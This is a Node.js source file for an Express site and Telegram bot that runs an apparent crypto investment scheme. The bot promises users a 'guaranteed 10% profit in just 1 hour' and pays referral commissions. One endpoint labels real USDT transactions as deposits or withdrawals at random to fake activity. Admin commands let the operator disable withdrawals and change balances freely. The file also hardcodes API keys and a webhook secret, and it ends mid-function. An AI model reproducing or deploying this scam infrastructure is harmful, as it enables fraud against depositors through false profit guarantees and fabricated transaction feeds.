require("dotenv").config();
const express = require("express");
const bcrypt = require("bcryptjs");
const { check, body, validationResult } = require("express-validator");
const validator = require("validator");
const { Telegraf, Scenes } = require("telegraf");
const botSession = require("telegraf").session;
const { Stage, BaseScene, WizardScene } = Scenes;
const axios = require("axios");
const crypto = require("crypto");
const cors = require("cors");
const session = require("express-session");
const flash = require("connect-flash");
const Bottleneck = require("bottleneck");
const { Web3 } = require("web3");
const { TronWeb } = require("tronweb");
const { v4: uuidv4 } = require("uuid");
const { exchangeRates, convert } = require("exchange-rates-api");
const tronWeb = new TronWeb({
  fullHost: "https://api.trongrid.io",
});
const usdtContractAddress = "41a614f803b6fd780986a42c78ec9c7f77e6ded13c";
const web3 = new Web3(
  "https://bsc-mainnet.infura.io/v3/695dd535f5bd428184ae7e0009765678"
);
const path = require("path");
const cron = require("node-cron");
const app = express();
const BOT_TOKEN = process.env.BOT_TOKEN;
const bot = new Telegraf(BOT_TOKEN);
const stage = new Stage();
const admin = process.env.ADMINS;
const weburl = process.env.WEB_URL;

process.on("uncaughtException", (err) => {
  console.error("Uncaught Exception:", err);
});
process.on("unhandledRejection", (reason, promise) => {
  console.error("Unhandled Rejection at:", promise, "reason:", reason);
});

function generateRandomString(length) {
  const characters =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  let result = "";
  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    result += characters[randomIndex];
  }
  return result;
}

const convertToUSD = async (amount, fromCurrency) => {
  try {
    const response = await axios.get(
      `https://v6.exchangerate-api.com/v6/662edb637847144c37d0f97f/latest/${fromCurrency}`
    );
    const rate = response.data.conversion_rates["USD"];
    const convertedAmount = amount * rate;
    return convertedAmount;
  } catch (error) {
    console.error("Error fetching exchange rate:", error.message);
    return null;
  }
};

bot.use(botSession());
bot.use(stage.middleware());

bot.catch((err, ctx) => {
  console.error(`Error for ${ctx.updateType}`, err);
  ctx.reply("Oops, something went wrong! Please try again later");
});

const {
  connectToDatabase,
  addUser,
  getUser,
  updateUser,
  allUser,
  resetAll,
  topReferrals,
  starkNilX,
} = require("./src/db/db");
const { userInfo } = require("os");
let adSessions = {};

function generateToken() {
  return Math.random().toString(36).substr(2);
}

async function generateWallet(u) {
  try {
    const res = await axios.post(
      "https://api.oxapay.com/merchants/request/staticaddress",
      {
        merchant: process.env.MERCHANT_KEY,
        currency: "USDT",
        network: "TRC20",
        callbackUrl: `${weburl}/paidio?userId=${u}`,
      }
    );

    let generatedAddress = res.data.address;
    let stat = res.data.result;

    if (stat == "100") {
      return generatedAddress;
    } else {
      return null;
    }
  } catch (error) {
    console.error("Error generating address:", error);
    return null;
  }
}

const corsOptions = {
  methods: "GET,HEAD,PUT,PATCH,POST",
  credentials: true,
  optionsSuccessStatus: 204,
};

app.use(cors(corsOptions));

connectToDatabase()
  .then(() => {})
  .catch(async (err) => {
    console.log("Error connecting to database");
    console.log(err);
    process.exit(1);
  });

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static("public"));
app.set("view engine", "ejs");
app.set("views", __dirname + "/src/views");

app.use(
  session({
    secret: process.env.SESSION_SECRET_KEY,
    resave: false,
    saveUninitialized: true,
  })
);

bot.start(async (ctx) => {
  const userId = ctx.from.id;

  const user = await getUser(userId);

  const pl = "https://i.ibb.co/d6gc3HG/IMG-5661.jpg";

  if (user && user.tg_id && user.tgLoggedIn) {
    ctx.replyWithPhoto(pl, {
      caption: `
  🚀 The bot uses your crypto in ultra-fast blockchain auctions, buying and reselling rare tokens within just a few hours.
  
  💎<b> Profits:</b>
  • The bot generates a 20% profit on every trade.
  • You receive 10%, and the remaining 10% is shared with the referral link that invited the investor: 5% / 5%.
  
  <b>💰 How It Works:</b>
  1️⃣ Deposit USDT into your account.
  2️⃣ Earn a guaranteed 10% profit in just 1 hour.
  3️⃣ Instantly withdraw your funds with no delays!`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "💸 Earn now",
              web_app: {
                url: weburl,
              },
            },
          ],
        ],
      },
    });

    return;
  }

  const check = ctx.message.text.split(" ")[1] || "";

  if (user || !check.startsWith("Auth-")) {
    console.log("Bot user not come with auth");
    ctx.reply("Unauthorized");
    return;
  }

  await ctx.replyWithHTML("<i>Connecting to " + check + "...</i>");

  const valid = await starkNilX.getAuth(check);

  if (!valid) {
    ctx.reply("Invalid Authentication method");
    return;
  }

  if ((Date.now() - valid.time) / 1000 > 60) {
    ctx.reply("Authentication exceed 1mins");
    return;
  }

  await starkNilX.updateWith(
    { uuid: valid.forUser },
    {
      $set: {
        tgLoggedIn: true,
        tg_id: userId,
      },
    }
  );

  await ctx.reply("Account connected successfully");

  ctx.replyWithPhoto(pl, {
    caption: `
      🚀 The bot uses your crypto in ultra-fast blockchain auctions, buying and reselling rare tokens within just a few hours.
      
      💎<b> Profits:</b>
      • The bot generates a 20% profit on every trade.
      • You receive 10%, and the remaining 10% is shared with the referral link that invited the investor: 5% / 5%.
      
      <b>💰 How It Works:</b>
      1️⃣ Deposit USDT into your account.
      2️⃣ Earn a guaranteed 10% profit in just 1 hour.
      3️⃣ Instantly withdraw your funds with no delays!`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "💸 Earn now",
            web_app: {
              url: weburl,
            },
          },
        ],
      ],
    },
  });
});

const renderHome = async (userdata, res) => {
  const {
    uuid,
    tg_id,
    balance,
    max_mining,
    last_mined_time,
    address,
    deposits,
    earnings,
    ghs,
    tgLoggedIn,
    u,
    refId,
  } = userdata;
  //console.log(userdata);

  let un = userdata?.loginDetails?.name;

  if (!un) {
    try {
      let n = await bot.telegram.getChat(tg_id);
      un = n.first_name || n.last_name;
    } catch (e) {
      un = "User";
    }
  }

  const wu = process.env.WEB_URL;

  const bLink = `${wu}?ref=${refId || ""}`;

  const all = {
    balance: balance,
    address,
    deposits,
    earnings,
    ghs,
    max_mining,
    last_mined_time,
    un,
    bLink,
    tgLoggedIn,
    bl: process.env.BOT_LINK,
  };

  if (!tgLoggedIn) {
    const auth = `Auth-${generateRandomString(15)}`;

    all.authenticateId = auth;

    await starkNilX.insertAuth({
      forUser: uuid,
      auth,
      time: Date.now(),
    });
  }

  if (userdata.claimedFirst === true) {
    const bb = await starkNilX.getBot();
    all.miningMinutes = bb.miningMinutes;
  } else {
    all.miningMinutes = 30;
  }

  return res.render("home", all);
};

app.post("/bankPayment", async (req, res) => {
  //console.log(req.body);

  const signature = req.headers["verif-hash"];

  if (!signature) {
    console.log("No signature");
    return res.status(401);
  }

  if (signature !== "32y7y378y32e7yh38e27") {
    console.log("Invalid signature");
    return res.status(401);
  }

  const event = req.body;

  res.status(200).send("Webhook received");

  if (
    event.event !== "charge.completed" ||
    event.data.status !== "successful"
  ) {
    console.log("Invalid deposit");
    return;
  }

  const { currency, amount, tx_ref } = event.data;
  const amm = await convertToUSD(amount, currency);

  if (!amm || isNaN(amm)) {
    console.log("Invalid amount");
    return;
  }

  const u = tx_ref.split("_")[1];
  const user = await starkNilX.findWith({ uuid: u });

  if (!user) {
    console.log("Invalid user");
    return;
  }

  if (user.todaysDepositCount >= 2) {
    console.log("User has deposited 2 times today already");
    if (u) {
      await bot.telegram.sendMessage(
        u,
        "You have deposited more than 2 times today"
      );
    }
    return;
  }

  const tg = user.tg_id;

  if (amm < 50) {
    if (tg) {
      await bot.telegram.sendMessage(
        u,
        `📥 You have deposited ${amount} USDT which is less than the minimum deposit`
      );
      return;
    }
  }

  const bbt = await starkNilX.getBot();

  let per = Number(bbt.miningPercentage);
  per = (per / 100) * amm;

  await starkNilX.updateWith(
    { uuid: u },
    {
      $inc: {
        deposits: amm,
        todaysDepositCount: 1,
      },
      $set: {
        max_mining: amm + per,
        ghs: amm * 10,
        last_mined_time: Date.now(),
      },
    }
  );

  if (tg) {
    bot.telegram.sendMessage(
      tg,
      `📥 You have deposited ${amount.toLocaleString()} ${currency} (${amm.toFixed(
        2
      )} USD)`
    );
  }

  bot.telegram.sendMessage(
    process.env.CHANNEL_URL,
    `
<b> ⭐️ USD Deposit Confirmed

USERID:</b> ${u}
<b>DEPOSITED AMOUNT:</b> ${amount.toLocaleString()} ${currency} (${amm.toFixed(
      2
    )} USD)

Your USDT deposit is now active and earning!

<i>Maximize your earnings with USD Investment! Deposit and start receiving hiurly commission <a href="t.me/UPCryptoIncBot?start">here.</a></i>`,
    {
      parse_mode: "HTML",
      disable_web_page_preview: true,
    }
  );
});

app.get("/", async (req, res) => {
  res.render("index");
});

app.get("/bs", async (req, res) => {
  try {
    const latestBlock = await tronWeb.trx.getBlock("latest");

    const usdtTransaction = latestBlock.transactions.find((transaction) => {
      return transaction.raw_data.contract.some((contract) => {
        return (
          contract.type === "TriggerSmartContract" &&
          contract.parameter.value.contract_address === usdtContractAddress
        );
      });
    });

    if (usdtTransaction) {
      const txDetails = await tronWeb.trx.getTransaction(usdtTransaction.txID);

      if (txDetails && txDetails.raw_data && txDetails.raw_data.contract) {
        const contract = txDetails.raw_data.contract.find(
          (c) =>
            c.type === "TriggerSmartContract" &&
            c.parameter.value.contract_address === usdtContractAddress
        );

        let from, to, amount;

        from = tronWeb.address.fromHex(contract.parameter.value.owner_address);

        const data = contract.parameter.value.data;

        const toAddressHex = data.slice(24, 64);
        to = tronWeb.address.fromHex(toAddressHex);

        const amountInSunHex = data.slice(64, 128);
        const amountInSun = tronWeb.toDecimal("0x" + amountInSunHex);
        amount = (amountInSun / 1e6).toFixed(2);
        const type = Math.random() < 0.5 ? "deposit" : "withdrawal";
        const transactionDetails = {
          type,
          hash: usdtTransaction.txID,
          from,
          to,
          value: amount,
        };

        return res.json(transactionDetails);
      } else {
        return res
          .status(404)
          .json({ success: false, message: "Transaction details not found" });
      }
    } else {
      return res
        .status(404)
        .json({ success: false, message: "No USDT transaction found" });
    }
  } catch (error) {
    console.error(error);
    return res
      .status(500)
      .json({ success: false, message: "An error occurred" });
  }
});

app.get("/signup", async (req, res) => {
  const user = await validateUser(req);
  if (user) {
    renderHome(user, res);
    return;
  }

  const all = {
    error: false,
    errorFor: "",
    errorMessage: "",
    datas: false,
    ref: "false",
  };

  if (req.query.ref) {
    all.ref = req.query.ref;
  }

  return res.render("signup", all);
});

app.post("/signup", async (req, res) => {
  const { name, email, password, passwordRepeat, ref } = req.body;

  const renderError = (res, field, message, data) => {
    return res.render("signup", {
      error: true,
      errorFor: field,
      errorMessage: message,
      datas: data,
      ref,
    });
  };

  const emailRegex = /^[a-zA-Z0-9._-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,6}$/;
  if (!email || !emailRegex.test(email)) {
    console.log("Invalid email");
    return renderError(res, "#for-em", "Invalid email address.", req.body);
  }

  const ex = await starkNilX.findWith({ "loginDetails.email": email });

  if (ex) {
    return renderError(
      res,
      "#for-em",
      "User with email already exist.",
      req.body
    );
  }

  if (!password || password.length < 8) {
    return renderError(
      res,
      "#for-ps",
      "Password must not less than 8.",
      req.body
    );
  }

  if (!/[A-Z]/.test(password)) {
    return renderError(
      res,
      "#for-ps",
      "Password must contain atleast one Uppercase.",
      req.body
    );
  }

  if (password !== passwordRepeat) {
    return renderError(res, "#for-rps", "Password must match.", req.body);
  }

  try {
    const hashedPassword = await bcrypt.hash(password, 10);

    req.body.password = hashedPassword;
    delete req.body.passwordRepeat;
    delete req.body.ref;

    req.body.email = req.body.email.toLowerCase();

    const uuid = uuidv4();

    const add = await generateWallet(uuid);

    if (!add) {
      res.render("signup", {
        error: "some",
        errorFor: "",
        errorMessage: "",
        datas: req.body,
        ref,
      });
    }

    await addUser({
      uuid,
      tg_id: null,
      balance: 0,
      deposits: 0,
      earnings: 0,
      upline: ref,
      referral: 0,
      claimedFirst: false,
      refId: generateRandomString(8),
      referEarning: 0,
      ghs: 300,
      address: add,
      downlines: [],
      max_mining: 3,
      last_mined_time: Date.now(),
      canWithdraw: true,
      ban: false,
      tgLoggedIn: false,
      webLoggedIn: true,
      loginDetails: req.body,
    });

    console.log("Account created successfully");

    res.redirect("/signin");
  } catch (error) {
    console.error(error);

    return res.render("signup", {
      error: "some",
      errorFor: "",
      errorMessage: "",
      datas: req.body,
      ref,
    });
  }
});

app.get("/signin", async (req, res) => {
  const user = await validateUser(req);
  if (user) {
    renderHome(user, res);
    return;
  }

  return res.render("signin", {
    error: false,
    errorFor: "",
    errorMessage: "",
    datas: false,
  });
});

app.post("/signin", async (req, res) => {
  let { email, password } = req.body;

  if (!email) {
    return res.render("signin", {
      error: true,
      errorFor: "#for-em",
      errorMessage: "Please provide an email.",
      datas: req.body,
    });
  }

  if (!password) {
    return res.render("signin", {
      error: true,
      errorFor: "#for-ps",
      errorMessage: "Please provide your password.",
      datas: req.body,
    });
  }

  email = validator.normalizeEmail(email);
  if (!validator.isEmail(email)) {
    return res.render("signin", {
      error: true,
      errorFor: "#for-em",
      errorMessage: "Invalid email format.",
      datas: req.body,
    });
  }
  if (password.length < 8) {
    return res.render("signin", {
      error: true,
      errorFor: "#for-ps",
      errorMessage: "Password must be at least 8 characters long.",
      datas: req.body,
    });
  }

  try {
    const user = await starkNilX.findWith({
      "loginDetails.email": email.toLowerCase(),
    });

    if (!user) {
      return res.render("signin", {
        error: true,
        errorFor: "#for-em",
        errorMessage: "User not found.",
        datas: req.body,
      });
    }

    const passwordMatch = await bcrypt.compare(
      password,
      user.loginDetails.password
    );

    if (!passwordMatch) {
      return res.render("signin", {
        error: true,
        errorFor: "#for-ps",
        errorMessage: "Incorrect password.",
        datas: req.body,
      });
    }

    req.session.user = user.uuid;
    req.session.type = "web";
    res.redirect("/home");
  } catch (error) {
    console.error("Error during signin:", error);
    return res.status(500).render("signin", {
      error: "some",
      errorFor: "",
      errorMessage: "",
      datas: req.body,
    });
  }
});

app.post("/validate-user", async (req, res) => {
  try {
    const { initData, initDataUnsafe } = req.body.data;

    if (
      !initDataUnsafe ||
      Object.keys(initDataUnsafe).length === 0 ||
      !initData
    ) {
      console.log("Invalid request 1");
      return res.redirect("/signin");
    }

    const { query_id, user, auth_date, hash } = initDataUnsafe;

    if (!query_id || !user || !auth_date || !hash) {
      console.log("Invalid request 2");
      return res.redirect("/failed");
    }

    const init = new URLSearchParams(initData);
    const hashh = init.get("hash");
    init.delete("hash");

    const dataToCheck = [...init.entries()]
      .map(([key, value]) => `${key}=${decodeURIComponent(value)}`)
      .sort()
      .join("\n");

    const secret = crypto
      .createHmac("sha256", "WebAppData")
      .update(BOT_TOKEN)
      .digest();

    const calculatedHash = crypto
      .createHmac("sha256", secret)
      .update(dataToCheck)
      .digest("hex");

    if (calculatedHash === hashh) {
      console.log("User validated successfully.");
      req.session.user = user.id;
      req.session.type = "tg";
      return res.redirect("/home");
    } else {
      console.log("Invalid user data.");
      return res.redirect("/failed");
    }
  } catch (err) {
    console.log("An error occurred " + err);
    return res.redirect("/failed");
  }
});

const validateUser = async (r) => {
  const t = r.session.type;
  const u = r.session.user;
  let user;
  if (t === "web") {
    user = await starkNilX.findWith({ uuid: u });
  } else if (t === "tg") {
    user = await starkNilX.findWith({ tg_id: u });
  } else {
    user = null;
  }
  return user;
};

app.get("/failed", async (req, res) => {
  return res.render("error");
});

app.get("/home", async (req, res) => {
  const userId = req.session.user;

  if (!userId) {
    console.log("Invalid user");
    return res.redirect("/signin");
  }

  const userdata = await validateUser(req);

  if (!userdata) {
    console.log("User not in database home");
    res.render("error");
    return;
  }

  if (userdata.ban) {
    res.render("error");
    return;
  }

  renderHome(userdata, res);
});

app.get("/pay", async (req, res) => {
  const userId = req.session.user;

  if (!userId) {
    console.log("Invalid user");
    return res.json({
      suc: false,
    });
  }
  let userdata = await validateUser(req);

  if (!userdata) {
    console.log("User not in database");
    return res.json({
      suc: false,
    });
  }

  const u = `txref_${userdata.uuid}_${Date.now()}`;

  res.render("pay", { u });
});

app.get("/claim", async (req, res) => {
  const userId = req.session.user;

  if (!userId) {
    console.log("Invalid user");
    return res.json({
      suc: false,
    });
  }
  let userdata = await validateUser(req);

  if (!userdata) {
    console.log("User not in database");
    return res.json({
      suc: false,
    });
  }

  if (userdata.ghs == 0 || userdata.max_mining == 0) {
    console.log("No ghs or mining");
    return res.json({
      suc: false,
    });
    return;
  }

  let bb = 30;

  if (userdata.claimedFirst === true) {
    bb = await starkNilX.getBot();
    bb = miningMinutes;
  }

  const { last_mined_time, max_mining, upline } = userdata;
  const currentTime = Date.now();
  const earningsPerHour = max_mining;
  const elapsedTimeInHours =
    (currentTime - last_mined_time) / (1000 * 60 * Number(bb));

  const totalEarnings = elapsedTimeInHours * earningsPerHour;

  if (totalEarnings < max_mining) {
    console.log("Not yet time to claim for " + userId);
    return res.json({
      suc: false,
    });
    return;
  }

  const ty = req.session.type === "web" ? "uuid" : "tg_id";
  const tyi = req.session.type === "web" ? userdata.uuid : userdata.tg_id;

  await starkNilX.updateWith(
    { [ty]: tyi },
    {
      $set: {
        last_mined_time: Date.now(),
        max_mining: 0,
        ghs: 0,
        claimedFirst: true,
      },
      $inc: {
        balance: max_mining,
        earnings: max_mining,
      },
    }
  );

  console.log("claim " + max_mining + " for " + userId);

  res.json({
    suc: true,
    bb: parseFloat((userdata.balance + max_mining).toFixed(1)).toLocaleString(),
    ll: Date.now(),
    tt: (userdata.earnings + max_mining).toFixed(1),
  });

  if (max_mining === 0.1 || upline === "false" || max_mining / 1.1 < 20) {
    return;
  }

  const uplineUser = await starkNilX.findWith({ refId: upline });

  if (!uplineUser) {
    console.log("Invalid upline");
    return;
  }

  let amm = (max_mining - max_mining / (1 + 0.1)) * 0.05;

  await starkNilX.updateWith(
    { refId: upline },
    {
      $inc: {
        balance: amm,
        referEarning: amm,
      },
    }
  );

  if (uplineUser.tg_id) {
    await bot.telegram.sendMessage(
      uplineUser.tg_id,
      "<b>🎉 Congratulations!</b> You Just Got " +
        amm +
        " USDT from a Referral earnings.",
      { parse_mode: "HTML" }
    );
  }

  return;
});

app.post("/paidio", async (req, res) => {
  let u = req.query.userId;

  const deals = req.body;

  if (!u) {
    res.status(400).send("Invalid user.");
    console.log("invalid user");
    return;
  }

  if (!deals) {
    res.status(400).send("Missing userId or deals in request.");
    console.log("missing id or data");
    return;
  }

  res.status(200).send("Webhook received successfully.");
  console.log("Received data of " + u);

  const user = await starkNilX.findWith({ uuid: u });

  u = user.tg_id;
  uu = user.tg_id || user.uuid;

  if (!user) {
    console.log("Can't find user " + user);
    return;
  }

  let { status, txID, amount } = deals;
  amount = parseFloat(amount);
  if (!amount || !txID || !status) {
    console.log("Incorrect datas");
    return;
  }

  if (status === "Confirming") {
    if (u) {
      await bot.telegram.sendMessage(
        u,
        `📥<b> You have an incoming deposit of ${amount} USDT</b>\n\n⌛️ <i>Confirmed  1/3...</i>`,
        {
          parse_mode: "HTML",
        }
      );
    }
    return;
  }

  if (status === "Paid") {
    if (amount < 50) {
      if (u) {
        await bot.telegram.sendMessage(
          u,
          `📥 You have deposited ${amount} USDT which is less than the minimum deposit`
        );
        return;
      }
    }

    if (user.todaysDepositCount >= 2) {
      console.log("User has deposited 2 times today already");
      if (u) {
        await bot.telegram.sendMessage(
          u,
          "You have deposited more than 2 times today"
        );
      }
      return;
    }

    if (u) {
      bot.telegram.sendMessage(u, `📥 You have deposited ${amount} USDT`);
    }

    bot.telegram.sendMessage(
      process.env.CHANNEL_URL,
      `
<b> ⭐️ USDT Deposit Confirmed

USERID:</b> ${uu}
<b>DEPOSITED AMOUNT:</b> ${amount} USDT
Your USDT deposit is now active and earning! View your transaction here:
<a href="https://tronscan.org/transaction/#/${txID}">${txID}</a><i>

Maximize your earnings with USDT Investment! Deposit and start receiving hiurly commission <a href="t.me/UPCryptoIncBot?start=${u}">here.</a></i>`,
      {
        parse_mode: "HTML",
        disable_web_page_preview: true,
      }
    );

    const bbt = await starkNilX.getBot();

    let per = Number(bbt.miningPercentage);
    per = (per / 100) * amount;

    await starkNilX.updateWith(
      { uuid: req.query.userId },
      {
        $inc: {
          deposits: amount,
          todaysDepositCount: 1,
        },
        $set: {
          max_mining: amount + per,
          ghs: amount * 10,
          last_mined_time: Date.now(),
        },
      }
    );

    console.log("done");
  } else {
    console.log("Status != paid");
  }
});

app.post("/www", async (req, res) => {
  const { amount, bank, wallet_addresss, account_number, account_name } =
    req.body;

  console.log(req.body);

  const userId = req.session.user;

  if (!userId) {
    console.log("Invalid user id");
    return res.status(401).json({
      suc: false,
      message: "Invalid user ID",
    });
  }

  const userdata = await validateUser(req);

  if (!userdata) {
    console.log("User not found in the database");
    return res.status(401).json({
      suc: false,
      message: "User not found",
    });
  }

  if (!wallet_addresss) {
    return res.status(401).json({
      suc: false,
      message: "Please input a valid wallet address!",
    });
  }

  if (!amount) {
    return res.status(400).json({
      suc: false,
      message: "Amount are required.",
    });
  }

  if (amount <= 0) {
    return res.status(400).json({
      suc: false,
      message: "Invalid withdrawal amount.",
    });
  }

  if (amount < 20) {
    return res.status(400).json({
      suc: false,
      message: "Minimum withdrawal is 20 USDT.",
    });
  }

  if (amount > userdata.balance) {
    return res.status(400).json({
      suc: false,
      message: "Withdrawal amount exceeds balance.",
    });
  }

  const bott = await starkNilX.getBot();

  if (!bott) {
    return res.status(500).json({
      suc: false,
      message: "Something went wrong. Please try again later.",
    });
  }

  if (bott.withdrawal === "disabled") {
    return res.status(500).json({
      suc: false,
      message: "Withdrawal is currently disabled.",
    });
  }

  try {
    const API_KEY = process.env.FAUCET_API_KEY;
    const currency = "USDT";

    const response = await axios.post(
      "https://faucetpay.io/api/v1/send",
      null,
      {
        params: {
          api_key: API_KEY,
          to: wallet_addresss,
          amount: amount,
          currency: currency,
        },
      }
    );

    console.log(response.data);

    const ty = req.session.type === "web" ? "uuid" : "tg_id";
    const tyi = req.session.type === "web" ? userdata.uuid : userdata.tg_id;

    await starkNilX.updateWith(
      { [ty]: tyi },
      {
        $inc: {
          balance: -parseFloat(amount),
        },
      }
    );

    res.status(200).json({
      suc: true,
      message: "Withdrawal has been submitted successfully!",
    });

    if (userdata.tg_id) {
      await bot.telegram.sendMessage(
        userdata.tg_id,
        `💰 <b>Withdrawal pending\n\n💰 Amount:</b> ${amount} USDT\n<b>📟 Status:</b> <code>Pending</code>`,
        {
          parse_mode: "HTML",
        }
      );
    }

    await bot.telegram.sendMessage(
      process.env.ADMIN_TO_RECEIVE_WITHDRAWAL_NOTIFICATION,
      `💰<b>New Withdrawal Request</b>\n\n<b>💸 Amount:</b> ${amount} USDT\n\👤 <b>User:</b> ${userId}\n✍️ <b>Type:</b> ${bank}\n<b>🤑 Address</b>: <code>${wallet_addresss}</code>`,
      {
        parse_mode: "HTML",
      }
    );
  } catch (error) {
    res.status(500).json({
      suc: false,
      message: "Withdrawal failed. Please try again later.",
    });

    console.error(error.response?.data || error.message);
    return;
  }
});

const validAdmin = (ctx, next) => {
  if (admin && admin.includes(ctx.from.id)) {
    next();
    return;
  }
  ctx.reply("You are not authorized to use this command");
};

bot.hears("/Panel", validAdmin, async (ctx) => {
  const user_count = await starkNilX.totalUsers();
  const bott = await starkNilX.getBot();

  const txt = `
Welcome ${ctx.from.first_name} to Admin Panel!
  
Total Users : ${user_count} 
Withdrawal status: ${
    bott.withdrawal === "disabled" ? "⛔️ disabled" : "✅ enabled"
  }
  
Here you can edit most of settings of the Bot.
  `;

  ctx.replyWithHTML(txt, {
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "🔊Send Broadcast",
            callback_data: "/broadcast",
          },
        ],
        [
          {
            text: "#️⃣ Mining Time",
            callback_data: "/setTime",
          },
          {
            text: "% Mining percentage",
            callback_data: "/percentage",
          },
        ],
        [
          {
            text: "⛔️ Ban User",
            callback_data: "/ban",
          },
          {
            text: "✅ Unban User",
            callback_data: "/unban",
          },
        ],
        [
          {
            text: "💶 Add balance",
            callback_data: "/addbal",
          },
          {
            text: "➖ Remove Balance",
            callback_data: "/removebal",
          },
        ],
        [
          {
            text: "🧳 Check balance",
            callback_data: "/checkbal",
          },
          {
            text: "❌ Banned Users",
            callback_data: "/bannedUsers",
          },
        ],
        [
          {
            text: "✅ Enable Withdrawals",
            callback_data: "/activate_1",
          },
        ],
        [
          {
            text: "❌ Disable Withdrawals",
            callback_data: "/activate_0",
          },
        ],
      ],
    },
  });
});

bot.action("/broadcast", validAdmin, async (ctx) => {
  ctx.answerCbQuery();
  await ctx.reply("Wait fetching all user in the database...");

  const all_user = await allUser();

  await ctx.replyWithHTML(
    "<b>All User Fetched Successfully</b>\n" + all_user.length + " Users"
  );
  const broad = new BaseScene("broad");
  broad.enter((ctx) => {
    ctx.reply("Enter the message you want to send");
  });
  broad.use(async (ctx) => {
    await ctx.scene.leave();
    await ctx.reply("Broadcasting message to all users...");
    let sucs = 0;
    let failed = 0;
    const MESSAGE_RATE_LIMIT = 30;

    const sendMessage = async (chatId) => {
      try {
        await ctx.telegram.copyMessage(
          chatId.tg_id,
          ctx.chat.id,
          ctx.message.message_id
        );
        sucs++;
      } catch (error) {
        failed++;
        console.error(`Error: ${error.message}`);
      }
    };

    const limiter = new Bottleneck({
      minTime: 1000 / MESSAGE_RATE_LIMIT,
      maxConcurrent: 1,
    });

    const processMessages = async (userIds) => {
      const promises = userIds.map((userId) =>
        limiter.schedule(() => sendMessage(userId))
      );
      await Promise.all(promises);
    };

    processMessages(all_user)
      .then(() => {
        ctx.replyWithHTML(
          `<b>🔊 Broadcast Completed Successfully\n\n✅ Successful:</b> ${sucs} User(s)\n<b>⛔️ Failed:</b> ${failed} User(s)`
        );
        console.log("All messages have been sent.");
      })
      .catch((error) => {
        console.error(`Failed to send messages: ${error.message}`);
      });
  });
  stage.register(broad);
  ctx.scene.enter("broad");
});

bot.action("/ban", validAdmin, async (ctx) => {
  ctx.answerCbQuery();
  const banScene = new BaseScene("ban");
  banScene.enter((ctx) => ctx.reply("Please send the user id to ban"));
  banScene.on("text", async (ctx) => {
    await ctx.scene.leave();
    const userId = ctx.message.text;

    const user = await getUser(parseFloat(userId));
    if (!user) {
      return ctx.reply("User not found");
    }
    await updateUser(parseFloat(userId), { $set: { ban: true } });
    ctx.reply("User banned successfully");
  });

  stage.register(banScene);
  ctx.scene.enter("ban");
});

bot.action("/unban", validAdmin, async (ctx) => {
  ctx.answerCbQuery();
  const banScene = new BaseScene("unban");
  banScene.enter((ctx) => ctx.reply("Please send the user id to unban"));
  banScene.on("text", async (ctx) => {
    await ctx.scene.leave();
    const userId = ctx.message.text;

    const user = await getUser(parseFloat(userId));
    if (!user) {
      return ctx.reply("User not found");
    }
    await updateUser(parseFloat(userId), { $set: { ban: false } });
    ctx.reply("User unbanned successfully");
  });
  stage.register(banScene);
  ctx.scene.enter("unban");
});

bot.action("/addbal", validAdmin, async (ctx) => {
  ctx.answerCbQuery();
  let userId;

  const text = new WizardScene(
    "addbal",
    async (ctx) => {
      await ctx.reply("Send the user id to add balance");
      return ctx.wizard.next();
    },
    async (ctx) => {
      userId = ctx.message.text;
      const user = await getUser(parseFloat(userId));
      if (!user) {
        return ctx.reply("User not found");
      }
      await ctx.reply("Send the amount to add");
      return ctx.wizard.next();
    },
    async (ctx) => {
      const amount = parseFloat(ctx.message.text);

      await updateUser(parseFloat(userId), { $inc: { balance: amount } });
      ctx.telegram.sendMessage(
        userId,
        "Your balance has been credited with " + amount
      );

      ctx.reply("Balance added successfully");
      return ctx.scene.leave();
    }
  );

  stage.register(text);
  ctx.scene.enter("addbal");
});

bot.action("/removebal", validAdmin, async (ctx) => {
  ctx.answerCbQuery();
  let userId;
  const text = new WizardScene(
    "rembal",
    async (ctx) => {
      await ctx.reply("Send the user id to remove balance");
      return ctx.wizard.next();
    },
    async (ctx) => {
      userId = ctx.message.text;
      const user = await getUser(parseFloat(userId));
      if (!user) {
        return ctx.reply("User not found");
      }
      await ctx.reply("Send the amount to remove");
      return ctx.wizard.next();
    },
    async (ctx) => {
      const amount = parseFloat(ctx.message.text);

      await updateUser(parseFloat(userId), { $inc: { balance: -amount } });
      ctx.telegram.sendMessage(
        userId,
        "your balance has been deducted by " + amount
      );

      ctx.reply("Balance removed successfully");
      return ctx.scene.leave();
    }
  );

  stage.register(text);
  ctx.scene.enter("rembal");
});

bot.action("/checkbal", validAdmin, async (ctx) => {
  ctx.answerCbQuery();
  const text = new BaseScene("text");
  text.enter((ctx) => ctx.reply("Send the user id to check balance"));
  text.on("text", async (ctx) => {
    await ctx.scene.leave();
    const txt = ctx.message.text;
    const user = await getUser(parseFloat(txt));
    if (!user) {
      return ctx.reply("User not found");
    }
    ctx.reply("Balance of " + txt + "\n\n Balance: " + user.balance + " USDT");
  });
  stage.register(text);
  ctx.scene.enter("text");
});

bot.action("/setTime", validAdmin, async (ctx) => {
  ctx.answerCbQuery();
  const text = new BaseScene("text");
  text.enter((ctx) => ctx.reply("Send mining time in minutes"));
  text.on("text", async (ctx) => {
    await ctx.scene.leave();
    const txt = ctx.message.text;

    if (isNaN(txt)) {
      ctx.reply("Minutes must be a number");
      return;
    }

    await starkNilX.updateBot({
      $set: {
        miningMinutes: Number(txt),
      },
    });

    ctx.reply("Minutes set to " + txt);
  });
  stage.register(text);
  ctx.scene.enter("text");
});

bot.action("/percentage", validAdmin, async (ctx) => {
  ctx.answerCbQuery();
  const text = new BaseScene("text");
  text.enter((ctx) =>
    ctx.reply("Send mining percentage eg. default is 10 (10%)")
  );
  text.on("text", async (ctx) => {
    await ctx.scene.leave();
    const txt = ctx.message.text;

    if (isNaN(txt)) {
      ctx.reply("Percentage must be a number");
      return;
    }

    await starkNilX.updateBot({
      $set: {
        miningPercentage: Number(txt),
      },
    });

    ctx.reply("Percentage set to " + txt + "%");
  });
  stage.register(text);
  ctx.scene.enter("text");
});

bot.action("/bannedUsers", validAdmin, async (ctx) => {
